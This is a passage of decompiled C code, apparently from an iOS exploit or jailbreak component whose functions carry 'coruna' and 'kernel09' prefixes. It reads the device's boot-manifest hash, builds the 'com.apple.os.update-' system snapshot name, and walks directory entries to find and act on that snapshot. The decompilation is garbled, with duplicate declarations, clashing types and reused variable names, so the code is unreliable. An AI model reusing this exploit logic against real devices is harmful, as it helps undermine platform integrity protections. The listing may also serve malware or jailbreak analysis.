  scratch[0x2b2] = '\0';
  scratch[0x2b3] = '\0';
  scratch[0x2b4] = '\0';
  scratch[0x2b5] = '\0';
  scratch[0x2b6] = '\0';
  scratch[0x2b7] = '\0';
  scratch[0x288] = '\0';
  scratch[0x289] = '\0';
  scratch[0x28a] = '\0';
  scratch[0x28b] = '\0';
  scratch[0x28c] = '\0';
  scratch[0x28d] = '\0';
  scratch[0x28e] = '\0';
  scratch[0x28f] = '\0';
  scratch[0x280] = '\0';
  scratch[0x281] = '\0';
  scratch[0x282] = '\0';
  scratch[0x283] = '\0';
  scratch[0x284] = '\0';
  scratch[0x285] = '\0';
  scratch[0x286] = '\0';
  scratch[0x287] = '\0';
  scratch[0x298] = '\0';
  scratch[0x299] = '\0';
  scratch[0x29a] = '\0';
  scratch[0x29b] = '\0';
  scratch[0x29c] = '\0';
  scratch[0x29d] = '\0';
  scratch[0x29e] = '\0';
  scratch[0x29f] = '\0';
  scratch[0x290] = '\0';
  scratch[0x291] = '\0';
  scratch[0x292] = '\0';
  scratch[0x293] = '\0';
  scratch[0x294] = '\0';
  scratch[0x295] = '\0';
  scratch[0x296] = '\0';
  scratch[0x297] = '\0';
  scratch[0x268] = '\0';
  scratch[0x269] = '\0';
  scratch[0x26a] = '\0';
  scratch[0x26b] = '\0';
  scratch[0x26c] = '\0';
  scratch[0x26d] = '\0';
  scratch[0x26e] = '\0';
  scratch[0x26f] = '\0';
  scratch[0x260] = '\0';
  scratch[0x261] = '\0';
  scratch[0x262] = '\0';
  scratch[0x263] = '\0';
  scratch[0x264] = '\0';
  scratch[0x265] = '\0';
  scratch[0x266] = '\0';
  scratch[0x267] = '\0';
  scratch[0x278] = '\0';
  scratch[0x279] = '\0';
  scratch[0x27a] = '\0';
  scratch[0x27b] = '\0';
  scratch[0x27c] = '\0';
  scratch[0x27d] = '\0';
  scratch[0x27e] = '\0';
  scratch[0x27f] = '\0';
  scratch[0x270] = '\0';
  scratch[0x271] = '\0';
  scratch[0x272] = '\0';
  scratch[0x273] = '\0';
  scratch[0x274] = '\0';
  scratch[0x275] = '\0';
  scratch[0x276] = '\0';
  scratch[0x277] = '\0';
  scratch[0x248] = '\0';
  scratch[0x249] = '\0';
  scratch[0x24a] = '\0';
  scratch[0x24b] = '\0';
  scratch[0x24c] = '\0';
  scratch[0x24d] = '\0';
  scratch[0x24e] = '\0';
  scratch[0x24f] = '\0';
  scratch[0x240] = '\0';
  scratch[0x241] = '\0';
  scratch[0x242] = '\0';
  scratch[0x243] = '\0';
  scratch[0x244] = '\0';
  scratch[0x245] = '\0';
  scratch[0x246] = '\0';
  scratch[0x247] = '\0';
  scratch[600] = '\0';
  scratch[0x259] = '\0';
  scratch[0x25a] = '\0';
  scratch[0x25b] = '\0';
  scratch[0x25c] = '\0';
  scratch[0x25d] = '\0';
  scratch[0x25e] = '\0';
  scratch[0x25f] = '\0';
  scratch[0x250] = '\0';
  scratch[0x251] = '\0';
  scratch[0x252] = '\0';
  scratch[0x253] = '\0';
  scratch[0x254] = '\0';
  scratch[0x255] = '\0';
  scratch[0x256] = '\0';
  scratch[599] = '\0';
  scratch[0x228] = '\0';
  scratch[0x229] = '\0';
  scratch[0x22a] = '\0';
  scratch[0x22b] = '\0';
  scratch[0x22c] = '\0';
  scratch[0x22d] = '\0';
  scratch[0x22e] = '\0';
  scratch[0x22f] = '\0';
  scratch[0x220] = '\0';
  scratch[0x221] = '\0';
  scratch[0x222] = '\0';
  scratch[0x223] = '\0';
  scratch[0x224] = '\0';
  scratch[0x225] = '\0';
  scratch[0x226] = '\0';
  scratch[0x227] = '\0';
  scratch[0x238] = '\0';
  scratch[0x239] = '\0';
  scratch[0x23a] = '\0';
  scratch[0x23b] = '\0';
  scratch[0x23c] = '\0';
  scratch[0x23d] = '\0';
  scratch[0x23e] = '\0';
  scratch[0x23f] = '\0';
  scratch[0x230] = '\0';
  scratch[0x231] = '\0';
  scratch[0x232] = '\0';
  scratch[0x233] = '\0';
  scratch[0x234] = '\0';
  scratch[0x235] = '\0';
  scratch[0x236] = '\0';
  scratch[0x237] = '\0';
  scratch[0x208] = '\0';
  scratch[0x209] = '\0';
  scratch[0x20a] = '\0';
  scratch[0x20b] = '\0';
  scratch[0x20c] = '\0';
  scratch[0x20d] = '\0';
  scratch[0x20e] = '\0';
  scratch[0x20f] = '\0';
  scratch[0x200] = '\0';
  scratch[0x201] = '\0';
  scratch[0x202] = '\0';
  scratch[0x203] = '\0';
  scratch[0x204] = '\0';
  scratch[0x205] = '\0';
  scratch[0x206] = '\0';
  scratch[0x207] = '\0';
  scratch[0x218] = '\0';
  scratch[0x219] = '\0';
  scratch[0x21a] = '\0';
  scratch[0x21b] = '\0';
  scratch[0x21c] = '\0';
  scratch[0x21d] = '\0';
  scratch[0x21e] = '\0';
  scratch[0x21f] = '\0';
  scratch[0x210] = '\0';
  scratch[0x211] = '\0';
  scratch[0x212] = '\0';
  scratch[0x213] = '\0';
  scratch[0x214] = '\0';
  scratch[0x215] = '\0';
  scratch[0x216] = '\0';
  scratch[0x217] = '\0';
  scratch[0x1e8] = '\0';
  scratch[0x1e9] = '\0';
  scratch[0x1ea] = '\0';
  scratch[0x1eb] = '\0';
  scratch[0x1ec] = '\0';
  scratch[0x1ed] = '\0';
  scratch[0x1ee] = '\0';
  scratch[0x1ef] = '\0';
  scratch[0x1e0] = '\0';
  scratch[0x1e1] = '\0';
  scratch[0x1e2] = '\0';
  scratch[0x1e3] = '\0';
  scratch[0x1e4] = '\0';
  scratch[0x1e5] = '\0';
  scratch[0x1e6] = '\0';
  scratch[0x1e7] = '\0';
  scratch[0x1f8] = '\0';
  scratch[0x1f9] = '\0';
  scratch[0x1fa] = '\0';
  scratch[0x1fb] = '\0';
  scratch[0x1fc] = '\0';
  scratch[0x1fd] = '\0';
  scratch[0x1fe] = '\0';
  scratch[0x1ff] = '\0';
  scratch[0x1f0] = '\0';
  scratch[0x1f1] = '\0';
  scratch[0x1f2] = '\0';
  scratch[499] = '\0';
  scratch[500] = '\0';
  scratch[0x1f5] = '\0';
  scratch[0x1f6] = '\0';
  scratch[0x1f7] = '\0';
  scratch[0x1c8] = '\0';
  scratch[0x1c9] = '\0';
  scratch[0x1ca] = '\0';
  scratch[0x1cb] = '\0';
  scratch[0x1cc] = '\0';
  scratch[0x1cd] = '\0';
  scratch[0x1ce] = '\0';
  scratch[0x1cf] = '\0';
  scratch[0x1c0] = '\0';
  scratch[0x1c1] = '\0';
  scratch[0x1c2] = '\0';
  scratch[0x1c3] = '\0';
  scratch[0x1c4] = '\0';
  scratch[0x1c5] = '\0';
  scratch[0x1c6] = '\0';
  scratch[0x1c7] = '\0';
  scratch[0x1d8] = '\0';
  scratch[0x1d9] = '\0';
  scratch[0x1da] = '\0';
  scratch[0x1db] = '\0';
  scratch[0x1dc] = '\0';
  scratch[0x1dd] = '\0';
  scratch[0x1de] = '\0';
  scratch[0x1df] = '\0';
  scratch[0x1d0] = '\0';
  scratch[0x1d1] = '\0';
  scratch[0x1d2] = '\0';
  scratch[0x1d3] = '\0';
  scratch[0x1d4] = '\0';
  scratch[0x1d5] = '\0';
  scratch[0x1d6] = '\0';
  scratch[0x1d7] = '\0';
  scratch[0x1a8] = '\0';
  scratch[0x1a9] = '\0';
  scratch[0x1aa] = '\0';
  scratch[0x1ab] = '\0';
  scratch[0x1ac] = '\0';
  scratch[0x1ad] = '\0';
  scratch[0x1ae] = '\0';
  scratch[0x1af] = '\0';
  scratch[0x1a0] = '\0';
  scratch[0x1a1] = '\0';
  scratch[0x1a2] = '\0';
  scratch[0x1a3] = '\0';
  scratch[0x1a4] = '\0';
  scratch[0x1a5] = '\0';
  scratch[0x1a6] = '\0';
  scratch[0x1a7] = '\0';
  scratch[0x1b8] = '\0';
  scratch[0x1b9] = '\0';
  scratch[0x1ba] = '\0';
  scratch[0x1bb] = '\0';
  scratch[0x1bc] = '\0';
  scratch[0x1bd] = '\0';
  scratch[0x1be] = '\0';
  scratch[0x1bf] = '\0';
  scratch[0x1b0] = '\0';
  scratch[0x1b1] = '\0';
  scratch[0x1b2] = '\0';
  scratch[0x1b3] = '\0';
  scratch[0x1b4] = '\0';
  scratch[0x1b5] = '\0';
  scratch[0x1b6] = '\0';
  scratch[0x1b7] = '\0';
  scratch[0x188] = '\0';
  scratch[0x189] = '\0';
  scratch[0x18a] = '\0';
  scratch[0x18b] = '\0';
  scratch[0x18c] = '\0';
  scratch[0x18d] = '\0';
  scratch[0x18e] = '\0';
  scratch[399] = '\0';
  scratch[0x180] = '\0';
  scratch[0x181] = '\0';
  scratch[0x182] = '\0';
  scratch[0x183] = '\0';
  scratch[0x184] = '\0';
  scratch[0x185] = '\0';
  scratch[0x186] = '\0';
  scratch[0x187] = '\0';
  scratch[0x198] = '\0';
  scratch[0x199] = '\0';
  scratch[0x19a] = '\0';
  scratch[0x19b] = '\0';
  scratch[0x19c] = '\0';
  scratch[0x19d] = '\0';
  scratch[0x19e] = '\0';
  scratch[0x19f] = '\0';
  scratch[400] = '\0';
  scratch[0x191] = '\0';
  scratch[0x192] = '\0';
  scratch[0x193] = '\0';
  scratch[0x194] = '\0';
  scratch[0x195] = '\0';
  scratch[0x196] = '\0';
  scratch[0x197] = '\0';
  scratch[0x168] = '\0';
  scratch[0x169] = '\0';
  scratch[0x16a] = '\0';
  scratch[0x16b] = '\0';
  scratch[0x16c] = '\0';
  scratch[0x16d] = '\0';
  scratch[0x16e] = '\0';
  scratch[0x16f] = '\0';
  scratch[0x160] = '\0';
  scratch[0x161] = '\0';
  scratch[0x162] = '\0';
  scratch[0x163] = '\0';
  scratch[0x164] = '\0';
  scratch[0x165] = '\0';
  scratch[0x166] = '\0';
  scratch[0x167] = '\0';
  scratch[0x178] = '\0';
  scratch[0x179] = '\0';
  scratch[0x17a] = '\0';
  scratch[0x17b] = '\0';
  scratch[0x17c] = '\0';
  scratch[0x17d] = '\0';
  scratch[0x17e] = '\0';
  scratch[0x17f] = '\0';
  scratch[0x170] = '\0';
  scratch[0x171] = '\0';
  scratch[0x172] = '\0';
  scratch[0x173] = '\0';
  scratch[0x174] = '\0';
  scratch[0x175] = '\0';
  scratch[0x176] = '\0';
  scratch[0x177] = '\0';
  scratch[0x148] = '\0';
  scratch[0x149] = '\0';
  scratch[0x14a] = '\0';
  scratch[0x14b] = '\0';
  scratch[0x14c] = '\0';
  scratch[0x14d] = '\0';
  scratch[0x14e] = '\0';
  scratch[0x14f] = '\0';
  scratch[0x140] = '\0';
  scratch[0x141] = '\0';
  scratch[0x142] = '\0';
  scratch[0x143] = '\0';
  scratch[0x144] = '\0';
  scratch[0x145] = '\0';
  scratch[0x146] = '\0';
  scratch[0x147] = '\0';
  scratch[0x158] = '\0';
  scratch[0x159] = '\0';
  scratch[0x15a] = '\0';
  scratch[0x15b] = '\0';
  scratch[0x15c] = '\0';
  scratch[0x15d] = '\0';
  scratch[0x15e] = '\0';
  scratch[0x15f] = '\0';
  scratch[0x150] = '\0';
  scratch[0x151] = '\0';
  scratch[0x152] = '\0';
  scratch[0x153] = '\0';
  scratch[0x154] = '\0';
  scratch[0x155] = '\0';
  scratch[0x156] = '\0';
  scratch[0x157] = '\0';
  scratch[0x128] = '\0';
  scratch[0x129] = '\0';
  scratch[0x12a] = '\0';
  scratch[299] = '\0';
  scratch[300] = '\0';
  scratch[0x12d] = '\0';
  scratch[0x12e] = '\0';
  scratch[0x12f] = '\0';
  scratch[0x120] = '\0';
  scratch[0x121] = '\0';
  scratch[0x122] = '\0';
  scratch[0x123] = '\0';
  scratch[0x124] = '\0';
  scratch[0x125] = '\0';
  scratch[0x126] = '\0';
  scratch[0x127] = '\0';
  scratch[0x138] = '\0';
  scratch[0x139] = '\0';
  scratch[0x13a] = '\0';
  scratch[0x13b] = '\0';
  scratch[0x13c] = '\0';
  scratch[0x13d] = '\0';
  scratch[0x13e] = '\0';
  scratch[0x13f] = '\0';
  scratch[0x130] = '\0';
  scratch[0x131] = '\0';
  scratch[0x132] = '\0';
  scratch[0x133] = '\0';
  scratch[0x134] = '\0';
  scratch[0x135] = '\0';
  scratch[0x136] = '\0';
  scratch[0x137] = '\0';
  scratch[0x108] = '\0';
  scratch[0x109] = '\0';
  scratch[0x10a] = '\0';
  scratch[0x10b] = '\0';
  scratch[0x10c] = '\0';
  scratch[0x10d] = '\0';
  scratch[0x10e] = '\0';
  scratch[0x10f] = '\0';
  scratch[0x100] = '\0';
  scratch[0x101] = '\0';
  scratch[0x102] = '\0';
  scratch[0x103] = '\0';
  scratch[0x104] = '\0';
  scratch[0x105] = '\0';
  scratch[0x106] = '\0';
  scratch[0x107] = '\0';
  scratch[0x118] = '\0';
  scratch[0x119] = '\0';
  scratch[0x11a] = '\0';
  scratch[0x11b] = '\0';
  scratch[0x11c] = '\0';
  scratch[0x11d] = '\0';
  scratch[0x11e] = '\0';
  scratch[0x11f] = '\0';
  scratch[0x110] = '\0';
  scratch[0x111] = '\0';
  scratch[0x112] = '\0';
  scratch[0x113] = '\0';
  scratch[0x114] = '\0';
  scratch[0x115] = '\0';
  scratch[0x116] = '\0';
  scratch[0x117] = '\0';
  scratch[0xe8] = '\0';
  scratch[0xe9] = '\0';
  scratch[0xea] = '\0';
  scratch[0xeb] = '\0';
  scratch[0xec] = '\0';
  scratch[0xed] = '\0';
  scratch[0xee] = '\0';
  scratch[0xef] = '\0';
  scratch[0xe0] = '\0';
  scratch[0xe1] = '\0';
  scratch[0xe2] = '\0';
  scratch[0xe3] = '\0';
  scratch[0xe4] = '\0';
  scratch[0xe5] = '\0';
  scratch[0xe6] = '\0';
  scratch[0xe7] = '\0';
  scratch[0xf8] = '\0';
  scratch[0xf9] = '\0';
  scratch[0xfa] = '\0';
  scratch[0xfb] = '\0';
  scratch[0xfc] = '\0';
  scratch[0xfd] = '\0';
  scratch[0xfe] = '\0';
  scratch[0xff] = '\0';
  scratch[0xf0] = '\0';
  scratch[0xf1] = '\0';
  scratch[0xf2] = '\0';
  scratch[0xf3] = '\0';
  scratch[0xf4] = '\0';
  scratch[0xf5] = '\0';
  scratch[0xf6] = '\0';
  scratch[0xf7] = '\0';
  scratch[200] = '\0';
  scratch[0xc9] = '\0';
  scratch[0xca] = '\0';
  scratch[0xcb] = '\0';
  scratch[0xcc] = '\0';
  scratch[0xcd] = '\0';
  scratch[0xce] = '\0';
  scratch[0xcf] = '\0';
  scratch[0xc0] = '\0';
  scratch[0xc1] = '\0';
  scratch[0xc2] = '\0';
  scratch[0xc3] = '\0';
  scratch[0xc4] = '\0';
  scratch[0xc5] = '\0';
  scratch[0xc6] = '\0';
  scratch[199] = '\0';
  scratch[0xd8] = '\0';
  scratch[0xd9] = '\0';
  scratch[0xda] = '\0';
  scratch[0xdb] = '\0';
  scratch[0xdc] = '\0';
  scratch[0xdd] = '\0';
  scratch[0xde] = '\0';
  scratch[0xdf] = '\0';
  scratch[0xd0] = '\0';
  scratch[0xd1] = '\0';
  scratch[0xd2] = '\0';
  scratch[0xd3] = '\0';
  scratch[0xd4] = '\0';
  scratch[0xd5] = '\0';
  scratch[0xd6] = '\0';
  scratch[0xd7] = '\0';
  scratch[0xa8] = '\0';
  scratch[0xa9] = '\0';
  scratch[0xaa] = '\0';
  scratch[0xab] = '\0';
  scratch[0xac] = '\0';
  scratch[0xad] = '\0';
  scratch[0xae] = '\0';
  scratch[0xaf] = '\0';
  scratch[0xa0] = '\0';
  scratch[0xa1] = '\0';
  scratch[0xa2] = '\0';
  scratch[0xa3] = '\0';
  scratch[0xa4] = '\0';
  scratch[0xa5] = '\0';
  scratch[0xa6] = '\0';
  scratch[0xa7] = '\0';
  scratch[0xb8] = '\0';
  scratch[0xb9] = '\0';
  scratch[0xba] = '\0';
  scratch[0xbb] = '\0';
  scratch[0xbc] = '\0';
  scratch[0xbd] = '\0';
  scratch[0xbe] = '\0';
  scratch[0xbf] = '\0';
  scratch[0xb0] = '\0';
  scratch[0xb1] = '\0';
  scratch[0xb2] = '\0';
  scratch[0xb3] = '\0';
  scratch[0xb4] = '\0';
  scratch[0xb5] = '\0';
  scratch[0xb6] = '\0';
  scratch[0xb7] = '\0';
  scratch[0x88] = '\0';
  scratch[0x89] = '\0';
  scratch[0x8a] = '\0';
  scratch[0x8b] = '\0';
  scratch[0x8c] = '\0';
  scratch[0x8d] = '\0';
  scratch[0x8e] = '\0';
  scratch[0x8f] = '\0';
  scratch[0x80] = '\0';
  scratch[0x81] = '\0';
  scratch[0x82] = '\0';
  scratch[0x83] = '\0';
  scratch[0x84] = '\0';
  scratch[0x85] = '\0';
  scratch[0x86] = '\0';
  scratch[0x87] = '\0';
  scratch[0x98] = '\0';
  scratch[0x99] = '\0';
  scratch[0x9a] = '\0';
  scratch[0x9b] = '\0';
  scratch[0x9c] = '\0';
  scratch[0x9d] = '\0';
  scratch[0x9e] = '\0';
  scratch[0x9f] = '\0';
  scratch[0x90] = '\0';
  scratch[0x91] = '\0';
  scratch[0x92] = '\0';
  scratch[0x93] = '\0';
  scratch[0x94] = '\0';
  scratch[0x95] = '\0';
  scratch[0x96] = '\0';
  scratch[0x97] = '\0';
  scratch[0x68] = '\0';
  scratch[0x69] = '\0';
  scratch[0x6a] = '\0';
  scratch[0x6b] = '\0';
  scratch[0x6c] = '\0';
  scratch[0x6d] = '\0';
  scratch[0x6e] = '\0';
  scratch[0x6f] = '\0';
  scratch[0x60] = '\0';
  scratch[0x61] = '\0';
  scratch[0x62] = '\0';
  scratch[99] = '\0';
  scratch[100] = '\0';
  scratch[0x65] = '\0';
  scratch[0x66] = '\0';
  scratch[0x67] = '\0';
  scratch[0x78] = '\0';
  scratch[0x79] = '\0';
  scratch[0x7a] = '\0';
  scratch[0x7b] = '\0';
  scratch[0x7c] = '\0';
  scratch[0x7d] = '\0';
  scratch[0x7e] = '\0';
  scratch[0x7f] = '\0';
  scratch[0x70] = '\0';
  scratch[0x71] = '\0';
  scratch[0x72] = '\0';
  scratch[0x73] = '\0';
  scratch[0x74] = '\0';
  scratch[0x75] = '\0';
  scratch[0x76] = '\0';
  scratch[0x77] = '\0';
  scratch[0x48] = '\0';
  scratch[0x49] = '\0';
  scratch[0x4a] = '\0';
  scratch[0x4b] = '\0';
  scratch[0x4c] = '\0';
  scratch[0x4d] = '\0';
  scratch[0x4e] = '\0';
  scratch[0x4f] = '\0';
  scratch[0x40] = '\0';
  scratch[0x41] = '\0';
  scratch[0x42] = '\0';
  scratch[0x43] = '\0';
  scratch[0x44] = '\0';
  scratch[0x45] = '\0';
  scratch[0x46] = '\0';
  scratch[0x47] = '\0';
  scratch[0x58] = '\0';
  scratch[0x59] = '\0';
  scratch[0x5a] = '\0';
  scratch[0x5b] = '\0';
  scratch[0x5c] = '\0';
  scratch[0x5d] = '\0';
  scratch[0x5e] = '\0';
  scratch[0x5f] = '\0';
  scratch[0x50] = '\0';
  scratch[0x51] = '\0';
  scratch[0x52] = '\0';
  scratch[0x53] = '\0';
  scratch[0x54] = '\0';
  scratch[0x55] = '\0';
  scratch[0x56] = '\0';
  scratch[0x57] = '\0';
  scratch[0x28] = '\0';
  scratch[0x29] = '\0';
  scratch[0x2a] = '\0';
  scratch[0x2b] = '\0';
  scratch[0x2c] = '\0';
  scratch[0x2d] = '\0';
  scratch[0x2e] = '\0';
  scratch[0x2f] = '\0';
  scratch[0x20] = '\0';
  scratch[0x21] = '\0';
  scratch[0x22] = '\0';
  scratch[0x23] = '\0';
  scratch[0x24] = '\0';
  scratch[0x25] = '\0';
  scratch[0x26] = '\0';
  scratch[0x27] = '\0';
  scratch[0x38] = '\0';
  scratch[0x39] = '\0';
  scratch[0x3a] = '\0';
  scratch[0x3b] = '\0';
  scratch[0x3c] = '\0';
  scratch[0x3d] = '\0';
  scratch[0x3e] = '\0';
  scratch[0x3f] = '\0';
  scratch[0x30] = '\0';
  scratch[0x31] = '\0';
  scratch[0x32] = '\0';
  scratch[0x33] = '\0';
  scratch[0x34] = '\0';
  scratch[0x35] = '\0';
  scratch[0x36] = '\0';
  scratch[0x37] = '\0';
  scratch[8] = '\0';
  scratch[9] = '\0';
  scratch[10] = '\0';
  scratch[0xb] = '\0';
  scratch[0xc] = '\0';
  scratch[0xd] = '\0';
  scratch[0xe] = '\0';
  scratch[0xf] = '\0';
  scratch[0] = '\0';
  scratch[1] = '\0';
  scratch[2] = '\0';
  scratch[3] = '\0';
  scratch[4] = '\0';
  scratch[5] = '\0';
  scratch[6] = '\0';
  scratch[7] = '\0';
  scratch[0x18] = '\0';
  scratch[0x19] = '\0';
  scratch[0x1a] = '\0';
  scratch[0x1b] = '\0';
  scratch[0x1c] = '\0';
  scratch[0x1d] = '\0';
  scratch[0x1e] = '\0';
  scratch[0x1f] = '\0';
  scratch[0x10] = '\0';
  scratch[0x11] = '\0';
  scratch[0x12] = '\0';
  scratch[0x13] = '\0';
  scratch[0x14] = '\0';
  scratch[0x15] = '\0';
  scratch[0x16] = '\0';
  scratch[0x17] = '\0';
  size = _IORegistryEntryFromPath
                    (*(uint32_t *)k_kernel_kiomasterportdefault_slot,"IODeviceTree:/chosen");
  if ((int)size == 0) {
    port = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return port;
    }
    ___stack_chk_fail();
  }
  port = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
  handle = _CFStringCreateWithCString(port,"boot-manifest-hash",0x8000100);
  if (handle == 0) {
    port = 0;
  }
  else {
    addr = _IORegistryEntryCreateCFProperty(size,handle,port,0);
    if (addr == 0) {
      port = 0;
    }
    else {
      off = _CFDataGetTypeID();
      base = _CFGetTypeID(addr);
      if (off == base) {
        version = _CFDataGetLength(addr);
        ptr = (byte *)_CFDataGetBytePtr(addr);
        if (0x7e < version - 1) goto done;
        ptr = scratch + 0x200;
        do {
          err = *ptr;
          *ptr = "0123456789ABCDEF"[(unsigned long)((err ^ size) >> 4) & 0xf];
          ptr[1] = "0123456789ABCDEF"[(unsigned long)(err ^ size) & 0xf];
          ptr = ptr + 2;
          u = (int)version - 1;
          version = (unsigned long)u;
          ptr = ptr + 1;
        } while (u != 0);
        _snprintf(scratch,0x200,"com.apple.os.update-%s");
        ptr = _strdup(scratch);
        if (ptr == (char *)0x0) goto done;
        *val = ptr;
        port = 1;
      }
      else {
done:
        port = 0;
      }
      _CFRelease(addr);
    }
    _CFRelease(handle);
  }
  _IOObjectRelease(size);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return port;
  }
  ___stack_chk_fail();
}





unsigned long coruna_call_getattrlistbulk_39278(void)

{
  unsigned long port;
  int *status;
  
  port = coruna_getattrlistbulk_29b50(0xff,0,0,0,0,0);
  if ((int)port != 0) {
    status = ___error();
    port = (unsigned long)(*status != 1);
  }
  return port;
}
uint64_t coruna_return_zero_1828c(char *path,long *handle,uint *size)
{
  int err;
  uint u;
  uint *ptr;
  void *ptr;
  uint64_t size;
  unsigned long version;
  uint *buf;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  scratch = k_kernel_rodata_word_0002aec8;
  scratch = k_kernel_rodata_word_2aec0;
  bootargs = k_kernel_rodata_word_2aed0;
  *size = 0;
  err = coruna_getattrlist();
  if (err == 0) {
    return 0;
  }
  err = _open(path,0x100000);
  if (err < 0) {
    return 0;
  }
  ptr = _calloc(0x1000,1);
  if (ptr != (uint *)0x0) {
    u = coruna_getattrlistbulk(err,&scratch,ptr,0x1000,0x40);
    if (-1 < (int)u) {
      *size = u;
      ptr = _calloc((unsigned long)u,8);
      *handle = (long)ptr;
      if (ptr != (void *)0x0) {
        if (u != 0) {
          version = 0;
          buf = ptr;
          do {
            if ((buf[1] & 1) == 0) {
              *(uint64_t *)(*handle + version * 8) = 0;
            }
            else {
              ptr = _calloc((unsigned long)buf[7],1);
              *(void **)(*handle + version * 8) = ptr;
              _strcpy(*(char **)(*handle + version * 8),(char *)(buf + 8));
              u = *size;
            }
            buf = (uint *)((long)buf + (unsigned long)*buf);
            version = version + 1;
          } while (version < u);
        }
        size = 1;
        if (0 < err) {
        _close(err);
        }
        if (ptr != (uint *)0x0) {
        _free(ptr);
        }
        return size;
      }
    }
  }
  size = 0;
fail:
  if (0 < err) {
    _close(err);
  }
  if (ptr != (uint *)0x0) {
    _free(ptr);
  }
  return size;
}





bool coruna_getattrlist(char *path)
{
  int err;
  uint64_t scratch;
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t serial_buf;
  uint32_t action;
  uint32_t thread_attr;
  uint32_t block_ctx;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  
  action = 0;
  stack_guard = 0;
  block_ctx = 0;
  host_info = 0;
  bootargs = 0;
  action = 0;
  thread_attr = 0;
  serial_buf = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  host_info = 5;
  serial_buf = 0x80020000;
  err = _getattrlist(path,&host_info,&scratch,0x4c,0x20);
  return err != 0 || (scratch & 0x20000) != 0;
}





byte coruna_kernel09_via_read_boot_manifest_hash(char *path,char *str_2,unsigned long arg)
{
  char *ptr;
  char *buf;
  unsigned long u;
  bool err;
  bool status;
  int err;
  int status;
  byte flags;
  unsigned long size;
  uint64_t *ptr;
  char *str;
  unsigned long version;
  uint64_t *buf;
  char *scratch;
  char *bootargs;
  uint thread_attr;
  uint64_t *host_info;
  
  host_info = (uint64_t *)0x0;
  thread_attr = 0;
  scratch = (char *)0x0;
  bootargs = (char *)0x0;
  err = coruna_read_boot_manifest_hash(&bootargs,0);
  if (((err == 0) || (err = coruna_read_boot_manifest_hash(&scratch,0x41), err == 0)) ||
     (err = coruna_return_zero_1828c(path,&host_info,&thread_attr), err == 0)) {
    flags = 0;
    err = -1;
    buf = host_info;
    version = (unsigned long)thread_attr;
    ptr = host_info;
    if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
    _free((void *)*ptr);
    version = version - 1;
    ptr = ptr + 1;
    } while (version != 0);
    _free(buf);
    }
    if (bootargs != (char *)0x0) {
    _free(bootargs);
    }
    if (scratch != (char *)0x0) {
    _free(scratch);
    }
    if (0 < err) {
    _close(err);
    }
    return flags;
  }
  err = _open(path,0x100000);
  buf = host_info;
  buf = bootargs;
  if (err < 0) {
    flags = 0;
    buf = host_info;
    version = (unsigned long)thread_attr;
    ptr = host_info;
    if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
    _free((void *)*ptr);
    version = version - 1;
    ptr = ptr + 1;
    } while (version != 0);
    _free(buf);
    }
    if (bootargs != (char *)0x0) {
    _free(bootargs);
    }
    if (scratch != (char *)0x0) {
    _free(scratch);
    }
    if (0 < err) {
    _close(err);
    }
    return flags;
  }
  version = (unsigned long)thread_attr;
  if (thread_attr == 0) {
    err = false;
    status = false;
    flags = err | status;
    buf = host_info;
    version = (unsigned long)thread_attr;
    ptr = host_info;
    if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
    _free((void *)*ptr);
    version = version - 1;
    ptr = ptr + 1;
    } while (version != 0);
    _free(buf);
    }
    if (bootargs != (char *)0x0) {
    _free(bootargs);
    }
    if (scratch != (char *)0x0) {
    _free(scratch);
    }
    if (0 < err) {
    _close(err);
    }
    return flags;
  }
  status = _strcmp((char *)*host_info,bootargs);
  if (status == 0) {
    status = false;
    err = true;
  }
  else {
    u = 1;
    do {
      size = u;
      ptr = scratch;
      if (version == size) {
        err = size < version;
        goto cleanup;
      }
      status = _strcmp((char *)buf[size],buf);
      u = size + 1;
    } while (status != 0);
    status = false;
    err = size < version;
  }
  flags = err | status;
  buf = host_info;
  version = (unsigned long)thread_attr;
  ptr = host_info;
  if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
  do {
  _free((void *)*ptr);
  version = version - 1;
  ptr = ptr + 1;
  } while (version != 0);
  _free(buf);
  }
  if (bootargs != (char *)0x0) {
  _free(bootargs);
  }
  if (scratch != (char *)0x0) {
  _free(scratch);
  }
  if (0 < err) {
  _close(err);
  }
  return flags;
}





byte coruna_kernel09_via_read_boot_manifest_hash_2(char *path,char *str_2)
{
  char *ptr;
  bool err;
  int err;
  int status;
  byte status;
  char *buf;
  char *str;
  unsigned long u;
  unsigned long size;
  uint64_t *ptr;
  uint64_t *buf;
  char *scratch;
  char *bootargs;
  uint thread_attr;
  uint64_t *host_info;
  
  host_info = (uint64_t *)0x0;
  thread_attr = 0;
  scratch = (char *)0x0;
  bootargs = (char *)0x0;
  err = coruna_read_boot_manifest_hash(&bootargs,0);
  if (((err == 0) || (err = coruna_read_boot_manifest_hash(&scratch,0x41), err == 0)) ||
     (err = coruna_return_zero_1828c(path,&host_info,&thread_attr), err == 0)) {
    status = 0;
    err = -1;
  }
  else {
    err = _open(path,0x100000);
    buf = host_info;
    ptr = scratch;
    if (err < 0) {
      status = 0;
    }
    else {
      size = (unsigned long)thread_attr;
      u = size;
      ptr = host_info;
      if (thread_attr != 0) {
        do {
          buf = (char *)*ptr;
          if ((buf != (char *)0x0) &&
             ((status = _strcmp(buf,ptr), status == 0 ||
              ((str_2 != (char *)0x0 && (status = _strcmp(buf,str_2), status == 0)))))) {
            err = false;
            status = 1;
            goto fail;
          }
          buf = bootargs;
          u = u - 1;
          ptr = ptr + 1;
        } while (u != 0);
        do {
          str = (char *)*buf;
          if ((str != (char *)0x0) && (status = _strcmp(str,buf), status == 0)) {
            status = coruna_getattrlistbulk_29b50(3,err,str,ptr,0,0);
            status = 0;
            err = status == 0;
            goto fail;
          }
          buf = buf + 1;
          size = size - 1;
        } while (size != 0);
      }
      status = 0;
      err = false;
fail:
      status = status | err;
    }
  }
  buf = host_info;
  u = (unsigned long)thread_attr;
  ptr = host_info;
